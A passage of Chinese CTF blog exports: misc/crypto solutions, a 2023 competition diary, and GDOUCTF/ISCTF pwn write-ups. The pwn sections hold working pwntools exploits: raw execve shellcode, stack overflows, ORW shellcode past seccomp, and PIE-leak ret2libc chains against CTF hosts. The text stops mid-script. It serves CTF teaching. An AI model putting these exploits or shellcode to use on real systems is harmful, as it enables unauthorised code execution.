mask\n注意，16109806864799210091 是 1000003 在模 $2^{64}$ 下的乘法逆元。\n可以参考：\njoostrijneveld.nl\n4.完整脚本import itertoolsmask = 0xffffffffffffffffinvmask = pow(1000003, -1, mask + 1)&quot;&quot;&quot;def shash(value):    length = len(value)    mask = 0xffffffffffffffff    x = (value[0] &lt;&lt; 7) &amp; mask    for c in value:        x = (1000003 * x) &amp; mask ^ c    x ^= length &amp; mask    return x&quot;&quot;&quot;def M1(a, b, c, d):    x = (a &lt;&lt; 7) &amp; mask    x = (1000003 * x) &amp; mask ^ a    x = (1000003 * x) &amp; mask ^ b    x = (1000003 * x) &amp; mask ^ c    x = (1000003 * x) &amp; mask ^ d    return xdef M2(p, m, r, y):    y = (y ^ r) * invmask &amp; mask    y = (y ^ m) * invmask &amp; mask    y = (y ^ p) * invmask &amp; mask    return ydic = &#123;&#125;# x ^= length &amp; mask# 7457312583301101235 ^ length &amp; mask = 7457312583301101236for i, j, k in itertools.product(range(256), repeat=3):    m = M2(i, j, k, y=7457312583301101236)    dic[m] = (i,j,k)for a, b, c, d in itertools.product(range(256), repeat=4):    m = M1(a, b, c, d)    if m in dic:        r = dic[m]        print(b, c, d, r)        print(f&quot;&#123;a:02x&#125;&#123;b:02x&#125;&#123;c:02x&#125;&#123;d:02x&#125;&#123;r[0]:02x&#125;&#123;r[1]:02x&#125;&#123;r[2]:02x&#125;&quot;)        break\n\nimport hashlibfrom Crypto.Util.number import long_to_byteskey = b&#x27;5d8cf03f5a0852&#x27;c = 13903983817893117249931704406959869971132956255130487015289848690577655239262013033618370827749581909492660806312017cc = int(hashlib.sha384(key).hexdigest(),16)print(cc)print(c^cc)print(long_to_bytes(c^cc))# 13903983817893096257191331302105079327691975168019975768926243203604911704907460100191445196042111296283969284429612# 56006392793428027524350123064630944990050645714249173991561467554927772009567904795068631029075949437# b&#x27;flag&#123;bdb537aa-87ef-4e95-bea4-2f79259bdd07&#125;&#x27;\n\n古典密码题目说明Atbash +base64 + caeser\n解题思路\nMisc火锅链观光打卡题目说明解题思路连接钱包用 metamask\n答对七个拿到 flag\n\nPower Trajectory Diagram题目说明解题思路侧信道攻击\n正确输入字符在某些时间点会触发明显的功耗低谷,这个低谷比其他普通字符更低。通过找到每个数据块中最低的低谷,就能还原出对应的字符\n\nimport numpy as npimport matplotlib.pyplot as plt# 加载数据data = np.load(&#x27;C:\\\\Users\\\\Nanian233\\\\Desktop\\\\attachment.npz&#x27;)inputs = data[&#x27;input&#x27;]traces = data[&#x27;trace&#x27;]# 定义每组的字符数量group_size = 40# 计算总组数num_groups = len(inputs) // group_size# 绘制每一组的功耗曲线for group in range(num_groups):    start_idx = group * group_size    end_idx = (group + 1) * group_size        # 提取当前组的输入字符和功耗曲线    group_inputs = inputs[start_idx:end_idx]    group_traces = traces[start_idx:end_idx]        # 找到当前组中功耗最低的曲线索引    min_trace_idx = np.argmin([np.min(trace) for trace in group_traces])        # 绘制当前组的所有功耗曲线    plt.figure(figsize=(12, 4))    for i, trace in enumerate(group_traces):        plt.plot(trace, label=group_inputs[i], alpha=0.5)        # 高亮显示功耗最低的曲线    plt.plot(group_traces[min_trace_idx], label=group_inputs[min_trace_idx], linewidth=3, color=&#x27;red&#x27;)        plt.title(f&#x27;Power Traces of Group &#123;group+1&#125;&#x27;)    plt.xlabel(&#x27;Sample Points&#x27;)    plt.ylabel(&#x27;Power Consumption&#x27;)    plt.legend(loc=&#x27;upper right&#x27;)    plt.tight_layout()    plt.show()\n\nimport numpy as npdata = np.load(&#x27;C:\\\\Users\\\\Nanian233\\\\Desktop\\\\attachment.npz&#x27;)a= data[&#x27;input&#x27;]b = data[&#x27;trace&#x27;]result = &quot;&quot;# 遍历数据块for i in range(12):    # 获取当前数据块的输入    sub_input = a[40 * i: 40 * (i + 1)]        # 找到当前数据块中每行的最小值索引    min1 = [np.argmin(b[i * 40 + j]) for j in range(40)]        # 找到最小值索引中的最大值索引    min2 = np.argmax(min1)        # 将找到的字符追加到结果字符串    result += sub_input[min2]# 打印结果字符串print(result)\n\n通风机题目说明工控\n解题思路西门子 7micro&#x2F;win 打开 wmp 文件\n发现文件缺少文件头，补上即可打开\n\n符号表下找到一串 base64\n\n\nflag{2467ce26-fff9-4008-8d55-17df83ecbfc2}\n4. 神秘文件题目说明解题思路第一部分：\n标题后面有密文\nQFCfpPQ6ZymuM3gq\n作者处有 key：lanjing\n管理者处有加密方式：Bifid cipher\n\n\n第二部分：\n把 pptm 改为 zip 并解压\n&#x2F;ppt&#x2F;embeddings&#x2F; Microsoft_Word_Document.docx\nWord 文档里改格式为正文\n\n枚举凯撒一个一个试\n\n\n第三部分：\n\nvba 的文件，用 oletools 反编译\n\nRC4 解密\n\n第四部分：\n第三页 ppt 中直接解密\n\n\n第五部分：\n第五页 ppt 底部拿到 base64 套娃密文\n\n\n第六部分：\n同上页全选之后随机拖一拖找到密文\n\n\n第七部分：\n&#x2F;ppt&#x2F;slides&#x2F;slide4.xml\n拿到密文和加密方式\n\n\n第八部分：\n&#x2F;ppt&#x2F;slideLayouts&#x2F;slideLayout2.xml 拿到提示\n\n去掉 B b 1 3 后解密\n\n第九部分：\n\nppt5 中间图里面还有一张残缺图，在源文件处可以拿到完整的\n第十部分：\n\n\n盗版软件题目说明解题思路先直接 strings 看看有啥玩意\n\n发现访问了很多网页，讯飞，火狐，百度等\n看到一个叫 winhack.exe 的，出现次数很多，怀疑是这个\nStrings -e | 3842.dmp |winhack  找到 winhack.com\nhackexe.exe 运行后打开.ss 得到 output.png\n\nStegsolve 出一个 zip 文件，但有杂糅，gpt 个脚本删一下\ndef process_file(input_file, output_file):    try:        with open(input_file, &#x27;rb&#x27;) as f:            data = f.read()                # Extract every other byte        new_data = data[::2]        with open(output_file, &#x27;wb&#x27;) as f:            f.write(new_data)        print(f&quot;Processed file saved as &#123;output_file&#125;&quot;)    except FileNotFoundError:        print(f&quot;Error: The file &#123;input_file&#125; does not exist.&quot;)    except Exception as e:        print(f&quot;An error occurred: &#123;e&#125;&quot;)# Usageinput_file = &#x27;inputfile&#x27;  # replace with your input file name without suffixoutput_file = &#x27;outputfile&#x27;  # replace with your desired output file name without suffixprocess_file(input_file, output_file)\n\n解压后得到.b 文件，打开是 base85\n解码后转 hex 丢 gpt\n这段经过hex编码的代码是一段Windows平台的x64 shellcode。解码后的内容大致如下:首先通过一系列指令对栈进行了对齐操作,并保存了一些寄存器的值。然后获取了当前进程的PEB(Process Environment Block)地址,并从中获取了当前进程的基址ImageBaseAddress。接着通过解析PE头,遍历导入表,找到了kernel32.dll的基址。然后根据导入表中函数名称的哈希值,定位到了GetProcAddress函数的地址。有了GetProcAddress函数后,就可以动态获取其他Windows API函数的地址了,比如LoadLibraryA、VirtualAlloc、WSAStartup等。接下来调用WSAStartup初始化套接字,再调用WSASocketA创建了一个TCP Socket。然后通过调用connect函数,连接到了特定的IP地址和端口(族ke编码所以ip看不出来)。连接成功后,再次调用VirtualAlloc分配一块可读可写可执行的内存,用于后续接收和执行远程代码。最后不断调用recv从socket接收数据到上述分配的内存中,并调用CreateThread创建线程从内存起始位置开始执行。\n\n可以试着写一个 loader 然后在本地运行用 winshark 抓包，但是直接保存到 bin 然后丢微步也能识别到特征\n\n"},{"title":"CTF2023_by_str1k3","url":"/2024/01/01/CTF2023/","content":"推荐用手机阅读，图片太大了\nlong live and pwn去年一直没啥年终总结，把大一上那半年也一起写下用时间线来叙述吧，纪念一下参加过的Timelinesec招新(doge)(后面我太忙了寄掉了)\nlibc_start_main9月份就这样来到了这里，嗯，就这样。军训最后几天就遇上了that’s when the story began\n#include &lt;CTF.h&gt;第一场新生赛是西电的，赛题很新生友好，貌似moeCTF2023没有moeCTF2022新生向了（？），有点怀念一步一步搭环境的日子懵懵懂懂的第一次团体CTF，啥也不会，就干出来一点misc，但做得很开心非常好wp接下来打了场UNCTF，单人赛，做出来的基本是日烂的题，但是有400分，坐牢但开心的一场中间参加了团队的面试，感谢@g0at和@aposimport misc十月初貌似打了长安杯，啥也不会，拿到了火眼但是根本不会用:)最暴殄天物的一集\nremote Hor1zon debugger大概这个时候战队定下了名字，有了自己的logo，长安杯的时候第一次面基，这个时候跟活跃的师傅们已经挺熟的了\nfrom pwn import rop开始学点pwn，貌似在11、12月份到寒假都在跟ELF文件、Linux之类的打交道，之前没学过，很新鲜，学了不少却又没那么清晰  天权信安的catf1ag貌似是我和Hor1zon打的第一场非新生CTF，看到一个ezarm就寄了，还是啥也不会寒假参加了一波hws的初赛（寄）和山石的冬令营，学到很多，更进一步令人遗憾的是当时一起参加Hor1zon招新的已经剩下不多了。情人节当天收到了很棒的抽奖奖品，很帅很爱\npackage GDOUCTF有幸作为部分出题人参与了GDOUCTF2023的出题（其实只有奇怪的ELF是我写的），主要是因为docker一开始玩不明白，题的思路也挺烂的。倒是m神主持的random pwn让师傅们好好干了一波随机数hhh这里要吐槽一下校园网，支持就支持，怎么给的服务器这么拉，小范围测试就寄了，赛后奖金也消失了:(。这里要@g0at，你做的好啊，香啊，很香啊，指找到长亭、hackingclub、NSSCTF三方强力援助。总之是办成功了，而且在校内再找到一些志同道合的新人。\ndef CTFs&#x2F;trevels_p1吃着火锅唱着歌就把奖拿了，这多是一件美事啊第一场线下赛是闽盾杯的决赛渗透。第一次单人坐飞机出远门，福州不错的，就是住的太经济了，有点难绷去年初赛“网络安全没有开卷考”可以笑一年,更难绷的是队里的主力去打上海市赛了，剩下俩二进制手去闽盾签到体验+坐牢渗透，啥不会，没进去，KFC很好吃，福师大半日游。\n接下来好像就国赛了，初赛搞了个canary爆破不错的，麻将那题最难绷决赛去了桂林。从湛江坐绿皮火车到桂林坐了十一个小时\nfrom lifepwn import *success(&quot;火车通宵&quot;)\n跟华南的师傅们面基了两波，一次晚上约饭一次火车站，见到了中大华师的大佬们，桂电一日游pwn爆零,队友带我拿下三等奖回家)\nvoid how2heap&#x2F;how2web(time)整个暑假基本都在跟着how2heap项目、pwn竞赛指南和CTFwiki去看堆学堆，没有大佬带，硬啃，很难受但学到很多惊叹于计算机之美，沉溺于二进制之道\n还在线上听了binX的渗透课和山石的夏令营，感觉渗透没实操还是听了&#x3D;不会，但是熟悉了一些流程。\n打了蓝帽杯和羊城杯的初赛。羊城杯初赛是真的大开眼界，异构(risc-V)、musl-libc、自实现vm的opcode、pop&#x2F;push only的shellcode题目,这下真borden my Hor1zon了。\n还有就是本博客，也是在暑假的时候搭起来的，感觉还是需要记录下自己的学习，当种田来打理对我来说动力也不小。\ndef CTFs&#x2F;trevels_p2这个学期强度极高，再加上学校方面的东西，我只能说没把人打死就不错了，但是很开心开学直冲羊城杯决赛，跟着山石网科打的，但是awdp没什么贡献，有点小难受接下来是蓝帽杯的半决赛，广州飞贵阳有延误，晚到很多，但还好有时间睡觉。出了一题UAF，很舒服。打卡贵警\n然后去了ISCC线下，从阳江一路高铁到北京\nfrom lifepwn import *success(&quot;高铁通宵&quot;)\n打卡北理工。线下赛制我觉得还是不错的，就是高低地的设定有点高估参赛选手了，放题的时间也很怪，晚上的大模型注入挺好玩，就是时间不够。水报告把pwn题的点全水中了，帮队伍拿下三等奖，很舒服。回程珠海半日游，路过打卡珠吉大（现珠科）。路过横琴口岸。\n过了好像半个月又去了蓝帽杯总决赛，这次体验了一波787头等舱，不愧是梦想大灰机打卡公大（没有在校园里拍照有点可惜(可能不能拍？)）签下四个三等奖(乐),实景渗透菠菜网站，真不会玩。回来的时候因为大雾晚了一天回学校，正好遇上一架因为被投硬币晚飞的B-777才回来。\nfrom lifepwn import*success(&quot;飞机延误到第二天&quot;)\n两次北京没去成清北有点小遗憾\n然后打了金砖-一带一路，这个赛制和主办方都极其抽象，第一次觉得大专之间亦有差距()。下午awd另外一队吃着火锅唱着歌就用ssh把所有人的机子都橄榄了，我们这边上了个通防一直被check扣分（寄！），但是CTF分数高拿下银牌:)打卡武大,最羡慕的一集\n马不停蹄第二天直冲鹏城杯(那里有两个做了两天牢的队友)，别问，问就是坐牢也得一起。但是打卡鹏城实验室+大疆总部场景很帅很真，但我不会:)\n最后是CICS2023的复赛(队长@g0at都忘了什么时候打的哈哈哈)，由于有考试第二天早上才打积分赛猛冲选择+GPT-plc猛猛冲分，我是plc大师.jpg。下午玩车联网因为设备问题没看更多题比较可惜。第二天早上的跨境数据位更寄，还好g0at✌会点工业流量。下午渗透火电厂+积分赛。最后2v4以30名垫底进决赛，明年南京安排上。接触了车联网，看了三菱和西门子的plc，力压Redbud和binX（这场确实），海带最win的一集单人坐船过海峡+打卡真海大+跨年之战+第一次异地跨年。\nvoid exit()2023到此结束，明年接着开冲\n写于2024.1.1,于琼州海峡船上\n","categories":["发电"],"tags":["发电"]},{"title":"GDOUCTF2023_pwn","url":"/2023/07/20/GDOUCTF2023-pwn/","content":"温故而知新[GDOUCTF 2023]真男人下120层\nv9 = __readfsqword(0x28u);  setbuf(_bss_start, 0LL);  v3 = time(0LL);  srand(v3);  v8 = 2772839826LL;  v4 = rand();  srand(v4 % 3 - 1522127470);...... if ( rand() % 4 + 1 != v6 )    &#123;      printf(&quot;\\x1B[31m&quot;);      puts(&quot;YOU DIED!&quot;);      printf(&quot;\\x1B[0m&quot;);      return 0;    &#125;    system(&quot;clear&quot;);  puts(&quot;Congratulation!&quot;);  cat_flag();  \n已知种子随机数种子有三种情况：0 - 15221274701 - 15221274702 - 1522127470\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;        int b;        //srand(0 - 1522127470);        srand(1 - 1522127470);        //srand(2 - 1522127470);//三选一，不行多跑几次        for (int i = 1; i &lt;=120; i++)&#123;                b = rand() % 4 + 1;                printf(&quot;\\&#x27;%d\\&#x27;,&quot;, b);        &#125;        return 0;&#125;\nfrom pwn import *context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)io = remote(&#x27;node5.anna.nssctf.cn&#x27;,28310)s = [&#x27;2&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;4&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;4&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;4&#x27;,&#x27;4&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,]for i in range(120):  io.recv()   io.sendline(str(s[i]))  io.recv()io.recv()io.recv()\n靶机随机数生成可能不一样，多试几次[GDOUCTF 2023]小学数学\nimport randomimport signaldef ran():    return random.randint(999,99999)def add():    question = f&quot;&#123;ran()&#125; + &#123;ran()&#125; = &quot;    print(question.replace(&#x27;+&#x27;,&#x27;-&#x27;))    answer = eval(question[:-2])        calc = input()    if calc == str(answer):        print(&quot;Correct.&quot;)    else:        print(&quot;Wrong.&quot;)        exit(0)def sub():    question = f&quot;&#123;ran()&#125; - &#123;ran()&#125; = &quot;    print(question.replace(&#x27;-&#x27;,&#x27;x&#x27;))    answer = eval(question[:-2])        calc = input()    if calc == str(answer):        print(&quot;Correct.&quot;)    else:        print(&quot;Wrong.&quot;)        exit(0)def mul():    question = f&quot;&#123;ran()&#125; x &#123;ran()&#125; = &quot;    print(question.replace(&#x27;x&#x27;,&#x27;//&#x27;))    answer = eval(question[:-2].replace(&#x27;x&#x27;,&#x27;*&#x27;))        calc = input()    if calc == str(answer):        print(&quot;Correct.&quot;)    else:        print(&quot;Wrong.&quot;)        exit(0)def div():    question = f&quot;&#123;ran()&#125; // &#123;ran()&#125; = &quot;    print(question.replace(&#x27;//&#x27;,&#x27;%&#x27;))    answer = eval(question[:-2])        calc = input()    if calc == str(answer):        print(&quot;Correct.&quot;)    else:        print(&quot;Wrong.&quot;)        exit(0)def mod():    question = f&quot;&#123;ran()&#125; % &#123;ran()&#125; = &quot;    print(question.replace(&#x27;%&#x27;,&#x27;+&#x27;))    answer = eval(question[:-2])        calc = input()    if calc == str(answer):        print(&quot;Correct.&quot;)    else:        print(&quot;Wrong.&quot;)        exit(0)print(&quot;  ____ ____   ___  _   _    ____ _____ _____ &quot;)print(&quot; / ___|  _ \\ / _ \\| | | |  / ___|_   _|  ___|&quot;)print(&quot;| |  _| | | | | | | | | | | |     | | | |_   &quot;)print(&quot;| |_| | |_| | |_| | |_| | | |___  | | |  _|  &quot;)print(&quot; \\____|____/ \\___/ \\___/   \\____| |_| |_|    &quot;)print(&quot;\t\t\t\t\t\t\t\t\t\t\t\t&quot;)print(&quot;Welcome to the calculate challenge. Please try to solve 300 Question in 600 seconds.&quot;)print(&quot;ATTENTION: This is an April Fool&#x27;s game, and the real problem may not be what it seems&quot;)print(&quot;&quot;)input(&quot;Press Enter to start...&quot;)signal.alarm(600)for i in range(300):    print(&quot;Round: &quot;+str(i+1))    random.choice([add,sub,mul,div,mod])()flag = open(&#x27;/flag&#x27;).read()print(&quot;Congratulations on passing the challenge. This is your flag: &quot; + str(flag))\n\nfrom pwn import *context.log_level = &#x27;debug&#x27;p = remote(&#x27;node2.anna.nssctf.cn&#x27;,29000)io.sendline(b&#x27;&#x27;)print(&#x27;plz wait..&#x27;)for i in range(300):    io.recvuntil(str(i+1).encode())    num1 = int(io.recvuntil(b&#x27; &#x27;))    op = io.recvuntil(b&#x27; &#x27;)    num2 = int(io.recvuntil(b&#x27; &#x27;))    print(num1, op[0], num2)    if(op[0] == ord(&#x27;-&#x27;)):        io.sendline(str(num1+num2).encode())    elif(op[0] == ord(&#x27;x&#x27;)):        io.sendline(str(num1-num2).encode())    elif(op[0] == ord(&#x27;/&#x27;)):        io.sendline(str(num1*num2).encode())    elif(op[0] == ord(&#x27;%&#x27;)):        io.sendline(str(num1//num2).encode())    else:        io.sendline(str(num1%num2).encode())io.interactive()\n\n\n[GDOUCTF 2023]奇怪的ELFLinux1直接运行就行Linux2是arm架构下编译的，走逆向\n.data:0000000000003A60                               ; char flag[17].data:0000000000003A60 F2 EE E3 D9 CA EF E8 F3 FE D9+flag DCB 0xF2, 0xEE, 0xE3, 0xD9, 0xCA, 0xEF, 0xE8, 0xF3, 0xFE, 0xD9, 0xF1, 0xE9, 0xF4, 0xEA, 0xE2, 0xA7, 0xFB\nflag =[0xCE, 0xDC, 0xC5, 0xD2, 0xC0, 0xFD, 0xF1, 0xE3, 0xEA, 0xE5, 0xE9, 0xEB, 0xE3, 0xD9, 0xF2, 0xE9, 0xD9,  0xF2, 0xEE, 0xE3, 0xD9, 0xCA, 0xEF, 0xE8, 0xF3, 0xFE, 0xD9,   0xF1, 0xE9, 0xF4, 0xEA, 0xE2, 0xA7, 0xFB] #flag1+flag2for i in flag:    print(chr(i^0x86),end=&#x27;&#x27;)\nHZCTF{welcome_to_the_Linux_world!}[GDOUCTF 2023]EASY PWN\nint check()&#123;  int result; // eax  char buf[10]; // [rsp+7h] [rbp-29h] BYREF  char s1[15]; // [rsp+11h] [rbp-1Fh] BYREF  ssize_t v3; // [rsp+20h] [rbp-10h]  int fd; // [rsp+28h] [rbp-8h]  int v5; // [rsp+2Ch] [rbp-4h]  v5 = 0;  fd = open(&quot;/dev/urandom&quot;, 0);  if ( fd &lt; 0 )  &#123;    puts(&quot;Can&#x27;t access /dev/urandom.&quot;);    exit(1);  &#125;  v3 = read(fd, buf, 0xAuLL);  if ( v3 &lt; 0 )  &#123;    puts(&quot;Data not received from /dev/urandom&quot;);    exit(1);  &#125;  close(fd);  puts(&quot;Password:&quot;);  gets(s1);  result = strcmp(s1, buf);  if ( result )    result = puts(&quot;I swore that was the right password ...&quot;);  else    v5 = 1;  if ( v5 )  &#123;    puts(&quot;Guess I couldn&#x27;t gaslight you!&quot;);    return print_flag();  &#125;  return result;&#125;\n把v5覆盖成不为0的值即可[GDOUCTF 2023]Shellcode\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[10]; // [rsp+6h] [rbp-Ah] BYREF  setbuf(stdin, 0LL);  setbuf(stderr, 0LL);  setbuf(stdout, 0LL);  mprotect((void *)((unsigned __int64)&amp;stdout &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7);  puts(&quot;Please.&quot;);  read(0, &amp;name, 0x25uLL);  puts(&quot;Nice to meet you.&quot;);  puts(&quot;Let&#x27;s start!&quot;);  read(0, buf, 0x40uLL);  return 0;&#125;\n可以看到第一个read可以把输入的东西直接写入.bss段，第二个read存在明显的栈溢出，所以思路很明确，第一次输入将shellcode写在.bss段上，再用第二次输入溢出后跳到.bss段执行shellcode。唯一坑：shellcode有长度限制\nfrom pwn import *import sgtlibcelf=ELF(&#x27;./shellcode&#x27;)pop_rdi_addr = 0x4007b3ret_addr = 0x4007ADmain_addr = 0x400687puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]bss_addr = 0x6010a0context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)p = remote(&#x27;node2.anna.nssctf.cn&#x27;,28500)#wrongpayload1 = asm(shellcraft())payload1=&quot;\\x48\\xBB\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x00\\x53\\x54\\x5F\\x31\\xF6\\x31\\xD2\\x6A\\x3B\\x58\\x0F\\x05&quot;p.sendlineafter(&quot;Please.\\n&quot;,payload1)payload2 =  b&#x27;a&#x27;*(0xa+8)+p64(bss_addr) p.sendlineafter(&#x27;start!\\n&#x27;,payload2)p.interactive()\n贴两个传送门：https://www.roderickchan.cn/zh-cn/2023-02-20-the-art-of-shellcode &#x2F;&#x2F;art of the shellcode            https://defuse.ca/online-x86-assembler.htm#disassembly  &#x2F;&#x2F;编译shellcode的网站\n[GDOUCTF 2023]Random开了沙盒\nstr1k3@ubuntu:~/Desktop$ seccomp-tools dump &#x27;/var/run/vmblock-fuse/blockdir/QC26KN/RANDOM&#x27;  line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005 0004: 0x06 0x00 0x00 0x00000000  return KILL 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n0x60100到0x60200这段内存可读可写可执行，所以尝试把shellcode写入这段后将执行流劫持到该段haha函数内存在jmp rsp指令\nfrom pwn import *from ctypes import *  context.arch=&#x27;amd64&#x27;# 连接远程p = remote(&quot;node6.anna.nssctf.cn&quot;,28969)# 加载rand函数的所在函数库libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)libc.srand(libc.time(0))#设置srand函数jmp_sp = 0x40094Edata_addr = 0x601000#通过随机数验证  程序会跳转到vulnerable函数p.sendlineafter(&quot;num:&quot;,str(libc.rand()%50))&quot;&quot;&quot;利用 jmp_sp + asm 的攻击方式  让sp指针跳回变量地址 执行shellcode:     在data_addr 0x601000 写入orw_shellcode后    并跳转执行data_addr 0x12300的orw_shellcode&quot;&quot;&quot;payload=asm(shellcraft.read(0,data_addr,0x100))#调用read函数 在data_addr 0x601000处写入 orw_shellcode内容payload+=asm(&#x27;mov rax,0x601000;call rax&#x27;)#并且call ax寄存器 调用执行 data_addr 0x601000处的orw_shellcodepayload=payload.ljust(0x28,b&#x27;\\x00&#x27;)#打满变量空间 和 rbp寄存器的字节payload+=p64(jmp_sp)#返回地址写成jmp_esp，继续运行当前sp后续指令 填写别的返回地址 就无法控制程序后面的执行流程了payload+=asm(&#x27;sub rsp,0x30;jmp rsp&#x27;)#此时sp已经离shellcode地址偏移0x30,这里把sp挪回到shellcode地址 并跳转到shellcodep.sendlineafter(&quot;your door\\n&quot;,payload)&quot;&quot;&quot;orw_shellcode执行的内容:打开本地的flag文件 把flag文件内容写入到 data_addr+0x100把输出data_addr+0x100的flag文件内容&quot;&quot;&quot;orw_shellcode = shellcraft.open(&quot;./flag&quot;)#打开本地的flag文件orw_shellcode += shellcraft.read(3, data_addr+0x100, 0x50)#文件描述符3:其它打开的文件 flag内容写入到data_addr+0x100orw_shellcode += shellcraft.write(1, data_addr+0x100,0x50)#文件描述符1:输出  地址data_addr+0x100存储的flag内容p.send(asm(orw_shellcode))p.interactive()","categories":["wp"],"tags":["random"]},{"title":"ISCTF_pwn","url":"/2023/12/02/ISCTF-pwn/","content":"非常好比赛，使我的脑袋旋转ISCTF_pwn附件ISCTF_wp_written_by_Hor1zon[ISCTF2023 ezpie]checksec主要难点是pie看看main有个格式化字符串漏洞，因为开了pie考虑泄露程序基址恰好此处能泄露func的地址\np.send(b&#x27;b&#x27;*(40-3) + b&#x27;v5:&#x27;)# pause()p.recvuntil(b&#x27;v5:&#x27;)v5 = u64(p.recvuntil(b&#x27;\\x0a&#x27;, drop=True) + b&#x27;\\0\\0&#x27;)success(&#x27;func_addr: %s&#x27;+ hex(func_addr))code_base = func_addr - elf.sym[&#x27;func&#x27;]success(&quot;code_base: %s&quot;,hex(code_base) )\n顺带着很多东西就能用了,\npop_rdi_ret =code_base + 0x0000000000001333pop_rsi_r15_ret =code_base + 0x0000000000001331ret_addr =code_base + 0x000000000000101aleave_ret =code_base + 0x0000000000001252  # : leave; ret; str_bin_sh =code_base + 0x0000000000002008pop_rax_ret =code_base + 0x00000000000012c8puts_got = code_base + elf.got[&#x27;puts&#x27;]puts_plt = code_base + elf.plt[&#x27;puts&#x27;]main_addr = code_base + elf.sym[&#x27;main&#x27;]syscall = code_base + 0x00000000000012c5pop_all = code_base+ 0x000000000000132cogg = code_base+0xe3afeogg2 = code_base +0xe3b01ogg3 = code_base+0xe3b04\nfunc内有处溢出，溢出空间蛮大的程序内有syscall和bin_sh字符串，应该是可以ret2syscall的，比较懒，打ret2libc这里用的是LibcSearcher,个人推荐把sgtlibc也装上，有时候libc版本能互补，用法可参考山石夏令营的结营赛wp\npayload2  = b&#x27;a&#x27; * 0x50 + b&#x27;b&#x27; * 8  +p64(pop_rdi_ret)+p64(puts_got) + p64(puts_plt)+ p64(main_addr)p.recvuntil(b&quot;please enter your information-&gt;&quot;)p.sendline(payload2)puts_addr = u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&#x27;puts: %s&#x27;,puts_addr)libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)#9 - libc6_2.31-0ubuntu9.9_amd64libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)system = libc_base + libc.dump(&#x27;system&#x27;)bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)one_gadget = libc_base + 0xe3afe#尝试过其他几个，貌似只有这个能打p.send(&#x27;fxxkingpie&#x27;)payload3  = b&#x27;a&#x27; * (0x50 + 0x8)payload3 += p64(ret_addr)payload3 += p64(pop_rdi_ret) + p64(bin_sh) + p64(system)+ p64(ret_addr)#payload3 += p64(pop_all) + p64(one_gadget)p.sendline(payload3)p.interactive()\n想打ret2one_gadget的话也要先泄露libc版本，实测能打完整exp如下\nfrom pwn import*from pwn import p64,u64#import sgtlibcfrom LibcSearcher import*elf=ELF(&#x27;./ezpie&#x27;)#libc = ELF(&#x27;/home/str1d3r/glibc-all-in-one/libs/2.31-0ubuntu9.12_amd64/libc.so.6&#x27;)context(os=&#x27;Linux&#x27;,arch = &#x27;amd64&#x27;,log_level 